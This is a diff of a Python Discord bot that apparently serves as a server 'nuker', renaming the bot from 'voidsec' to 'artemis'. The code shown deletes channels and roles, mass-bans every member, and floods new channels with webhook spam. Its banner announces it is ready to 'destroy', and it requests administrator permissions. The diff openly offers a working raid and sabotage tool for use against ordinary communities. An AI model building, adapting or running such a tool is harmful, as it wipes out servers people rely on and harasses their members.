@@ -11,7 +11,7 @@ from itertools import cycle
 from colorama import Fore
 import random
 
-with open("C:/Users/Administrator/Downloads/voidsec.png", "rb") as file: # replace this with your own file path
+with open("C:/Users/ur/path/real", "rb") as file: # replace this with your own file path
   servicon = file.read()
 
 penny = "token here lel"
@@ -28,9 +28,9 @@ webhooknames = channels
 
 prefix = "v!" # doesnt have to be a var but i prefer it like this
 
-voidsec = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+artemis = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
 
-@voidsec.event
+@artemis.event
 async def on_ready():
     print(Fore.RED + f"""
 ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗███████╗██████╗ 
@@ -40,14 +40,14 @@ async def on_ready():
 ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
 ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
 {Fore.YELLOW}[i] Destroyer: Ready to destroy some Gachas.
-{Fore.YELLOW}[i] Username: {voidsec.user}
-{Fore.YELLOW}[i] User ID: {voidsec.user.id}
+{Fore.YELLOW}[i] Username: {artemis.user}
+{Fore.YELLOW}[i] User ID: {artemis.user.id}
 {Fore.YELLOW}[i] Selfbot: False
 {Fore.YELLOW}[i] Bot: True
 {Fore.YELLOW}[i] Prefix: {prefix}
-{Fore.YELLOW}[i] Creator: VoidSec
+{Fore.YELLOW}[i] Creator: Artemis
 {Fore.YELLOW}[i] Help: Type v!help for a list of commands.
-{Fore.YELLOW}[i] Invite URL: https://discord.com/oauth2/authorize?client_id={voidsec.user.id}&scope=bot&permissions=8
+{Fore.YELLOW}[i] Invite URL: https://discord.com/oauth2/authorize?client_id={artemis.user.id}&scope=bot&permissions=8
 """)
 
 async def delchans(ctx):
@@ -77,7 +77,7 @@ async def croles(ctx):
         except:
             print(f"{Fore.RED}[-] Role not created")
 
-@voidsec.command()
+@artemis.command()
 async def nuke(ctx):
     await ctx.message.delete()
     void = ctx.guild
@@ -88,7 +88,7 @@ async def nuke(ctx):
         croles(ctx)
     )
 
-@voidsec.command()
+@artemis.command()
 async def mban(ctx):
     void = ctx.guild
     await ctx.message.delete()
@@ -100,7 +100,7 @@ async def mban(ctx):
             except:
                 print(f"{Fore.RED}[-] {member} not banned")
 
-@voidsec.event
+@artemis.event
 async def on_guild_channel_create(channel):
     try:
        await channel.create_webhook(name="nutdestroyer420", avatar=servicon)
@@ -112,7 +112,7 @@ async def on_guild_channel_create(channel):
           await webhook.send(random.choice(msgcum))
           await channel.send(random.choice(msgcum))
 
-@voidsec.command()
+@artemis.command()
 async def roledel(ctx):
     void = ctx.guild
     await ctx.message.delete()
@@ -123,4 +123,4 @@ async def roledel(ctx):
         except:
             print(f"{Fore.RED}[-] Role not deleted")
 
-voidsec.run(penny)
+artemis.run(penny)
